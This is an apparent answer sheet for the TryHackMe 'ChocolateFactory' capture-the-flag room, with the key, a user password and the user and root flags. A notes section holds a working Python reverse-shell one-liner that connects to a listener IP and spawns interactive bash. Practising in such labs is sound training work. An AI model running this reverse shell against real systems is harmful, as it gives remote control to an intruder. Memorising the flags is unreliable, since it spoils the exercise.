# TryHackMe ChocolateFactory

# Saikat Karmakar | Jan 19:2021


# Task 2 
1. Enter the key you found!
```
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```
2. What is Charlie's password?
```
cn7824
```
3. Enter the user flag
```
flag{cd5509042371b34e4826e4838b522d2e}
```
4. Enter the root flag
```
flag{cec59161d338fef787fcb4e296b42124}
```


***Notes***
revshell
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.23.120",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```